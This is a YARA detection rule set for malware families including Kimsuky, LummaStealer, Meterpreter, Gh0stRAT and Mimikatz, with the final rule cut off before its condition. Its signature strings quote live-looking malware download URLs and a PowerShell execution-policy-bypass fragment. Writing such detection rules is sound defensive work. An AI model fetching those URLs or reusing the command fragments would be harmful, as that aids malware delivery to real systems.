/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule Kimsuky_signature__6b93e6ef151a06a5df1eed09ff6fdd16_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_6b93e6ef151a06a5df1eed09ff6fdd16(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1958894129800843f627bc791ae046f9f4c5b26a4cb7bd7b6d684b110be690a"
   strings:
      $s1 = "cvsil.dll" fullword ascii /* score: '23.00'*/
      $s2 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s3 = "Content-Disposition: form-data; name=\"binary\"; filename=\"" fullword wide /* score: '12.00'*/
      $s4 = "6\\:2<\">" fullword ascii /* score: '9.00'*/ /* hex encoded string 'b' */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule Meterpreter_signature__b4c6fff030479aa3b12625be67bf4914_imphash__65272fcd {
   meta:
      description = "_subset_batch - file Meterpreter(signature)_b4c6fff030479aa3b12625be67bf4914(imphash)_65272fcd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "65272fcdbacaba07a03ff50ad36428ba855d3c9253f83a230fe3809016c1e541"
   strings:
      $s1 = "server.dll" fullword ascii /* score: '23.00'*/
      $s2 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      all of them
}

rule Havoc_signature__9fa8d0247bb66845c1e0716a0448226e_imphash_ {
   meta:
      description = "_subset_batch - file Havoc(signature)_9fa8d0247bb66845c1e0716a0448226e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e56af917cb649665d57b6b8a19ddaa5c814039e42c9e19e4464a0565e6c5450"
   strings:
      $x1 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "LOADER: DLL unloaded after %d attempt(s)!" fullword wide /* score: '28.00'*/
      $s8 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s9 = "LOADER: child process exited (return code: %d)" fullword ascii /* score: '27.00'*/
      $s10 = "LOADER: processing multi-package reference: %s %s" fullword ascii /* score: '27.00'*/
      $s11 = "LOADER: failed to remove temporary directory - trying to force unload DLLs..." fullword wide /* score: '27.00'*/
      $s12 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s13 = "LOADER: ucrtbase.dll found: %s" fullword ascii /* score: '25.00'*/
      $s14 = "LOADER: end of process reached!" fullword ascii /* score: '24.00'*/
      $s15 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 29000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__0c402b7c2c6ba6c4f999ffa4ecc5af87_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_0c402b7c2c6ba6c4f999ffa4ecc5af87(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "990f40fc05943213fbcc5e3d37bd7bde571291470b1f1e24d15271600895cbad"
   strings:
      $x1 = "-NoProfile -ExecutionPolicy Bypass -Command \"" fullword wide /* score: '39.00'*/
      $s2 = "http://84.21.189.22:5554/klasport.exe" fullword wide /* score: '30.00'*/
      $s3 = "', 'C:\\Users', 'C:\\ProgramData' -ErrorAction Stop" fullword wide /* score: '25.00'*/
      $s4 = "C:\\Users\\danar\\OneDrive\\" fullword ascii /* score: '24.00'*/
      $s5 = "eads.exe" fullword wide /* score: '22.00'*/
      $s6 = "http://1211.121.12.12:2221/ecker.exe" fullword wide /* score: '22.00'*/
      $s7 = "rgwet.exe" fullword wide /* score: '22.00'*/
      $s8 = " ShellExecute" fullword wide /* score: '21.00'*/
      $s9 = "FileDownloader" fullword wide /* score: '19.00'*/
      $s10 = "ShellExecute " fullword wide /* score: '18.00'*/
      $s11 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s12 = " CreateProcess. PID: " fullword wide /* score: '15.00'*/
      $s13 = "CreateProcess " fullword wide /* score: '15.00'*/
      $s14 = "\\Add\\klipop\\x64\\Release\\klipop.pdb" fullword ascii /* score: '14.00'*/
      $s15 = "--- ?? ????? ???? ?????? ???????? ??? 28 ??: " fullword ascii /* score: '13.00'*/ /* hex encoded string '(' */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__67463553 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67463553.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67463553753e10cbf8bb92c6a4d451740d8c0574ed69a128aecf5218c165a5c5"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "https://stacysublett.com/wp-content/plugins/Idovl.vdf" fullword wide /* score: '22.00'*/
      $s3 = "RFQ.exe" fullword wide /* score: '19.00'*/
      $s4 = "ARFQ, Version=1.0.4318.21930, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s6 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s7 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s8 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s9 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s10 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s12 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s13 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s14 = "getBuffer" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      8 of them
}

rule Kimsuky_signature__e03a6a95f29e8bd35886583b710e4f69_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_e03a6a95f29e8bd35886583b710e4f69(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3314b6ea393e180c20db52448ab6980343bc3ed623f7af91df60189fec637744"
   strings:
      $x1 = "httpSpy.dll" fullword ascii /* score: '31.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "%s%s&%s%s&%s%08X" fullword ascii /* score: '8.00'*/
      $s4 = "%s%sc %s 2>%s" fullword wide /* score: '8.00'*/
      $s5 = "%s%sc %s >%s 2>&1" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      1 of ($x*) and all of them
}

rule Kimsuky_signature__e03a6a95f29e8bd35886583b710e4f69_imphash__ce97a3e7 {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_e03a6a95f29e8bd35886583b710e4f69(imphash)_ce97a3e7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ce97a3e7a8c964a3300ebc940fdbed335c55f008afafc5cfc3f6661b5a5a4446"
   strings:
      $x1 = "httpSpy.dll" fullword ascii /* score: '31.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "%s%s&%s%s&%s%08X" fullword ascii /* score: '8.00'*/
      $s4 = "%s%sc %s 2>%s" fullword wide /* score: '8.00'*/
      $s5 = "%s%sc %s >%s 2>&1" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule Gh_stRAT_signature__c509dbcf0dade053e5588087a4d64742_imphash_ {
   meta:
      description = "_subset_batch - file Gh-stRAT(signature)_c509dbcf0dade053e5588087a4d64742(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b3c017fe3dd226f63696c32f178e58002b78b34a2e0fc2beba3c32aba0046cc"
   strings:
      $s1 = "SPUNINST.EXE" fullword wide /* score: '22.00'*/
      $s2 = "%sot%%\\System32\\svc%s %s%s%s" fullword ascii /* score: '19.00'*/
      $s3 = "SOFTWARE\\mIcRoSoFt\\wINDoWS nt\\currentVerSioN\\sVChoST" fullword ascii /* score: '17.00'*/
      $s4 = "%SystemRo" fullword ascii /* base64 encoded string*/ /* score: '17.00'*/
      $s5 = "eludom" fullword ascii /* reversed goodware string*/ /* score: '15.00'*/
      $s6 = "AemaNyeKecivreSteG" fullword ascii /* reversed goodware string*/ /* score: '14.00'*/
      $s7 = "AecivreSnepO" fullword ascii /* reversed goodware string*/ /* score: '14.00'*/
      $s8 = "AemaNyalpsiDecivreSteG" fullword ascii /* reversed goodware string*/ /* score: '14.00'*/
      $s9 = "%SESSIONNAME%" fullword ascii /* score: '11.00'*/
      $s10 = "%SESSIONNAME%\\" fullword ascii /* score: '11.00'*/
      $s11 = "SYSTEM\\CurrentControlSet\\seRviCes\\" fullword ascii /* score: '10.00'*/
      $s12 = "kerNEl32" fullword ascii /* score: '10.00'*/
      $s13 = "&2*8.233-_3" fullword ascii /* score: '9.00'*/ /* hex encoded string '(#3' */
      $s14 = "<,=3=D=^=" fullword ascii /* score: '9.00'*/ /* hex encoded string '=' */
      $s15 = "hdivxhvidc" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      8 of them
}

rule HijackLoader_signature_ {
   meta:
      description = "_subset_batch - file HijackLoader(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2657cb207fecb8c9d335ef1b0e4ff67d5ad8b706e3f71928182337bfadee0a13"
   strings:
      $x1 = "@Stdactns@TCommonDialogAction@ExecuteTarget$qqrp14System@TObject" fullword ascii /* score: '31.00'*/
      $s2 = "Temperature.dll" fullword wide /* score: '30.00'*/
      $s3 = "c:\\sources\\madshi\\madExcept32.dll" fullword wide /* score: '29.00'*/
      $s4 = "@Stdactns@THelpContents@ExecuteTarget$qqrp14System@TObject" fullword ascii /* score: '28.00'*/
      $s5 = "**************** GetProcessDpiAwareness : " fullword wide /* score: '28.00'*/
      $s6 = "Failed to read encoded PEM private key" fullword wide /* score: '28.00'*/
      $s7 = "rundll32.exe %s,%s" fullword wide /* score: '27.50'*/
      $s8 = "rundll32.exe %s,%s %s" fullword wide /* score: '27.50'*/
      $s9 = "@Extactns@TDownLoadURL@ExecuteTarget$qqrp14System@TObject" fullword ascii /* score: '27.00'*/
      $s10 = "http://ascstats.iobit.com/other/db_temp_download.php" fullword wide /* score: '27.00'*/
      $s11 = "Winsock startup error ws2_32.dll - " fullword wide /* score: '27.00'*/
      $s12 = "@Dialogs@TCommonDialog@Execute$qqrv" fullword ascii /* score: '26.00'*/
      $s13 = "D:\\worker\\HUOQI\\ZhangHaitaoSVN\\Project\\Driver\\Other\\TemperatureMonitor\\HardwareLib\\Release\\HardwareLib.pdb" fullword ascii /* score: '26.00'*/
      $s14 = "/Index out of range (%d).  Must be >= 0 and < %d7String index out of range (%d).  Must be >= 1 and <= %d[Invalid UTF32 character" wide /* score: '26.00'*/
      $s15 = "cThis \"Portable Network Graphics\" image uses an unknown interlace scheme which could not be decoded.-The chunks must be compat" wide /* score: '26.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 30000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__a0ac45e9380ce040c54f78b5a8a527e3_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_a0ac45e9380ce040c54f78b5a8a527e3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b4de9268a0d00fab6daef928145c4a1d1d2f66a05b99757e077dcff6115c382"
   strings:
      $x1 = "7Dispatch methods do not support more than 64 parameters=Error decoding URL style (%%XX) encoded string at position %d1Invalid U" wide /* score: '38.00'*/
      $s2 = "Execute not supported: %s1Operation not allowed on a unidirectional dataset" fullword wide /* score: '29.00'*/
      $s3 = "Field '%s' has no dataset\"Circular datalinks are not allowed/Lookup information for field '%s' is incomplete0Cannot perform thi" wide /* score: '22.00'*/
      $s4 = "Variable not found: %s=Component does not support scripting. Class: %0:s, Name: %1:s.Object does not support scripting. Class: %" wide /* score: '20.50'*/
      $s5 = "33333333333333333333333333333330" ascii /* score: '19.00'*/ /* hex encoded string '3333333333333330' */
      $s6 = "34333333333333333333333333333333" ascii /* score: '19.00'*/ /* hex encoded string '4333333333333333' */
      $s7 = "3333333333333333333333333333333A" ascii /* score: '19.00'*/ /* hex encoded string '333333333333333:' */
      $s8 = "63333333333333333333333333333330" ascii /* score: '19.00'*/ /* hex encoded string 'c333333333333330' */
      $s9 = "33333333333333333333333333333378" ascii /* score: '19.00'*/ /* hex encoded string '333333333333333x' */
      $s10 = "33333333333333333333333333333368" ascii /* score: '19.00'*/ /* hex encoded string '333333333333333h' */
      $s11 = "5333333333333333333333333333333C" ascii /* score: '19.00'*/ /* hex encoded string 'S33333333333333<' */
      $s12 = "2333333333333333333333333333333e" ascii /* score: '19.00'*/ /* hex encoded string '#33333333333333>' */
      $s13 = "eInterBase library gds32.dll not found in the path. Please install InterBase to use this functionalityoInterBase Install DLL ibi" wide /* score: '19.00'*/
      $s14 = "Component %s not foundDGetting the Count of a TComponentsEnumerator object is not supportedWComponent was expected to implement " wide /* score: '19.00'*/
      $s15 = "IB.SQL.MONITOR.Mutex4_1" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule Metasploit_signature__f6f702196a9b61a140306ad6860146c8_imphash_ {
   meta:
      description = "_subset_batch - file Metasploit(signature)_f6f702196a9b61a140306ad6860146c8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0a1521874c2f80382419270a6946f9ba51fa8bb7a6847a09b7d5b961972d3fe3"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:v3=\"urn:schemas-microsoft-com:asm.v3\"><asse" ascii /* score: '48.00'*/
      $x2 = "Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language" ascii /* score: '39.00'*/
      $x3 = "API_ShellExecute(A_ScriptFullPath,\"-rcnwinrec \" . GetUserSid(), A_ScriptDir,\"RUNAS\")" fullword ascii /* score: '38.00'*/
      $x4 = "winmgmts.ExecNotificationQueryAsync( deleteSink, \"SELECT * FROM __InstanceDeletionEvent WITHIN \" . glb[ \"RecentProcTrackInter" ascii /* score: '36.00'*/
      $x5 = "this.LoadDllFunction( \"user32.dll\", \"SystemParametersInfoW\" )" fullword ascii /* score: '32.00'*/
      $x6 = "cmd /C chkdsk >D:\\chkdsk_log.txt {N} W15 {N}D:\\chkdsk_log.txt" fullword ascii /* score: '31.00'*/
      $s7 = "API_ShellExecute(target,args = \"\", work_dir = \"\",verb = \"\",nShowCmd=1)" fullword ascii /* score: '30.00'*/
      $s8 = "cmd /C netstat -a >C:\\netstat.txt {N} W1 {N} C:\\netstat.txt" fullword ascii /* score: '30.00'*/
      $s9 = "    Delete Temporary Internet Files@RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8" fullword ascii /* score: '29.00'*/
      $s10 = "CallResult := DllCall(\"Psapi.dll\\GetModuleFileNameExW\", \"Ptr\", hProcess, \"Ptr\", 0, \"Ptr\", &ModuleFileName, \"UInt\", Fi" ascii /* score: '28.00'*/
      $s11 = "if e := DllCall(\"Psapi.dll\\GetProcessImageFileName\", \"Ptr\", h, \"Str\", n, \"UInt\", A_IsUnicode ? s//2 : s)" fullword ascii /* score: '28.00'*/
      $s12 = "oTarget.cmd := cmdLine != \"\" ? cmdLine : execPath" fullword ascii /* score: '28.00'*/
      $s13 = "CallResult := DllCall(\"Psapi.dll\\GetProcessImageFileNameW\", \"Ptr\", hProcess, \"Str\", ModuleFileName, \"UInt\", FileNameSiz" ascii /* score: '28.00'*/
      $s14 = "oTarget.cmd := execPath != \"\" ? execPath : cmdLine" fullword ascii /* score: '28.00'*/
      $s15 = "query := \"SELECT * FROM Win32_Process WHERE ProcessId != '\" DllCall( \"GetCurrentProcessId\" ) \"' AND Name = '\" A_ScriptName" ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__0f97e9459679f04f3613748707ab7390_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_0f97e9459679f04f3613748707ab7390(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d791dd09fab6c7e085e92633b7cb9ad36267ee5cfb689c7ae549fe1d7b826213"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s3 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule LummaStealer_signature__233f0771dea1c02ae3ee4d2cf95f3185_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_233f0771dea1c02ae3ee4d2cf95f3185(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fec0208bb1c71da5003749e376ae51e308c996a84f975417755f6e6b1234215a"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "C:\\Balavida.bin" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule LummaStealer_signature__e19fa692f3715134ca54de4a8b165eb4_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_e19fa692f3715134ca54de4a8b165eb4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3910dc28206052867196a1f0528f84e7c863db5db3e79b5447ce4c9332f7fedd"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s3 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s4 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Latrodectus_signature__db7aeb75528663639689f852fd366243_imphash_ {
   meta:
      description = "_subset_batch - file Latrodectus(signature)_db7aeb75528663639689f852fd366243(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c79568e853b1bd106eb3e6364fb3ff3ffb3d46d2eb3486debca04d424a82b76"
   strings:
      $s1 = "\\??\\C:\\TEMP\\Latrodectus.log" fullword wide /* score: '30.00'*/
      $s2 = "E\\??\\C:\\TEMP\\Latrodectus.log" fullword wide /* score: '29.00'*/
      $s3 = "UpdaterTag.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Download file %s error" fullword wide /* score: '16.00'*/
      $s5 = "ERROR download file %s" fullword wide /* score: '13.00'*/
      $s6 = "Download file %s" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule Kimsuky_signature__25be9394598a93b97d1cd4a2abb39e2f_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_25be9394598a93b97d1cd4a2abb39e2f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5b3cc9cced1ef0cb0bba5549cc2ac09c49ae10554d2409ea16bc5e118d278c15"
   strings:
      $x1 = "httpSpy.dll" fullword ascii /* score: '31.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "\\$,3\\$8" fullword ascii /* score: '10.00'*/ /* hex encoded string '8' */
      $s4 = "\\$(3\\$0" fullword ascii /* score: '10.00'*/ /* hex encoded string '0' */
      $s5 = "%s%s&%s%s&%s%08X" fullword ascii /* score: '8.00'*/
      $s6 = "%s%sc %s 2>%s" fullword wide /* score: '8.00'*/
      $s7 = "%s%sc %s >%s 2>&1" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Kimsuky_signature__63585e768a543d853098c1ee239fdbcb_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_63585e768a543d853098c1ee239fdbcb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a637d9836285254831c80fdd407f4dae440ad382a23ca12abae2d721cffe913f"
   strings:
      $x1 = "httpSpy.dll" fullword ascii /* score: '31.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "D:\\02.data\\03.atk-tools\\engine\\niki\\httpSpy\\..\\bin\\httpSpy.pdb" fullword ascii /* score: '25.00'*/
      $s4 = "Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 109.0.3729.169 Safari / 537.36" fullword wide /* score: '9.00'*/
      $s5 = "%s%s&%s%s&%s%08X" fullword ascii /* score: '8.00'*/
      $s6 = "%s%sc %s 2>%s" fullword wide /* score: '8.00'*/
      $s7 = "%s%sc %s >%s 2>&1" fullword wide /* score: '8.00'*/
      $s8 = "del /F \"%s\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule Kimsuky_signature__8ea5ff210af349dfdc4d10877e379754_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_8ea5ff210af349dfdc4d10877e379754(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5b8f6d76e9f63920654266814daa12e80ad13cf07e87c29a9a8e167a7bf4ea4a"
   strings:
      $s1 = "ekslgkfk.dll" fullword ascii /* score: '23.00'*/
      $s2 = "zgyfkwu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule Kimsuky_signature__8ea5ff210af349dfdc4d10877e379754_imphash__6d8c5194 {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_8ea5ff210af349dfdc4d10877e379754(imphash)_6d8c5194.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6d8c5194c7e728b394c5f419d666ed8f178e696c707fd6071f7bf33a2e6e8b79"
   strings:
      $s1 = "ekslgkfk.dll" fullword ascii /* score: '23.00'*/
      $s2 = "QQQQBv" fullword ascii /* reversed goodware string 'vBQQQQ' */ /* score: '11.00'*/
      $s3 = "U3QQQQ- xu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule GlobeImposter_signature__ba2ce247fa49357770ce28f139e2f1ab_imphash_ {
   meta:
      description = "_subset_batch - file GlobeImposter(signature)_ba2ce247fa49357770ce28f139e2f1ab(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5c3ce324ded0942df4b4cbf80cf195263f105daf5c729255c628bb3a4f8ab3de"
   strings:
      $s1 = "rsa_encrypt" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule Gh_stRAT_signature__319fe90009d9ce0aa4e432b3b8307a17_imphash_ {
   meta:
      description = "_subset_batch - file Gh-stRAT(signature)_319fe90009d9ce0aa4e432b3b8307a17(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "51d75b54018eda95c4c93e1077cd799b13231ecbae89b9f88d68f00d17a65441"
   strings:
      $s1 = "AyTX:\\N" fullword ascii /* score: '10.00'*/
      $s2 = "!Win32 .EXE." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule Gh_stRAT_signature__c8d8ab2105b98430234d0a20519aef66_imphash_ {
   meta:
      description = "_subset_batch - file Gh-stRAT(signature)_c8d8ab2105b98430234d0a20519aef66(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e61c39cf5f38a3b42274812099783339fd4bd5cd832fef54f6ce55e211a6231"
   strings:
      $s1 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii /* score: '27.00'*/
      $s2 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii /* score: '21.00'*/
      $s3 = "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters" fullword ascii /* score: '15.50'*/
      $s4 = "^^^^^^N" fullword ascii /* reversed goodware string 'N^^^^^^' */ /* score: '11.00'*/
      $s5 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s6 = "icKeyToken='6595b64144ccf1df' language='*' />" fullword ascii /* score: '10.00'*/
      $s7 = "^^^3^^^9^^^" fullword ascii /* score: '9.00'*/ /* hex encoded string '9' */
      $s8 = "%4d-%.2d-%.2d %.2d:%.2d" fullword ascii /* score: '9.00'*/ /* hex encoded string 'M----' */
      $s9 = "^^^.^^^%^^^'^^^+^^^7^^^*^^^0^^^" fullword ascii /* score: '9.00'*/ /* hex encoded string 'p' */
      $s10 = "3^9+.3^^^^9\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '99' */
      $s11 = "%s%d.jpg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule Loda_signature__ef471c0edf1877cd5a881a6a8bf647b9_imphash_ {
   meta:
      description = "_subset_batch - file Loda(signature)_ef471c0edf1877cd5a881a6a8bf647b9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7b45615e4a0b4e17598a1b3280941ba767268aa6bfb89d6b5a871fbd043384cf"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = "kernel32.dllE" fullword ascii /* score: '16.00'*/
      $s3 = " publicKeyToken=\"6595b64144ccf1df\"/>" fullword ascii /* score: '13.00'*/
      $s4 = "GetValu" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule MimiKatz_signature__3989f8318b472a37373fef97ebfe996b_imphash_ {
   meta:
      description = "_subset_batch - file MimiKatz(signature)_3989f8318b472a37373fef97ebfe996b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0462d93a6e7627198db1f39287fbe9300098c08249cee2f874c8d3aa69afc1c1"
   strings:
      $s1 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s2 = "cxkniubi.exe" fullword wide /* score: '22.00'*/
      $s3 = "\\pipe\\spools" fullword ascii /* score: '14.00'*/
      $s4 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s5 = "Tlsa.Xlog" fullword ascii /* score: '12.00'*/
      $s6 = "Copyright (c) 2007 - 2020 xiaozhanniubi (Benjamin DELPY)" fullword wide /* score: '12.00'*/
      $s7 = "Process" fullword ascii /* score: '11.00'*/
      $s8 = "e?GetValue?" fullword ascii /* score: '9.00'*/
      $s9 = "operaW[" fullword ascii /* score: '9.00'*/
      $s10 = "mlLX!." fullword ascii /* score: '8.00'*/
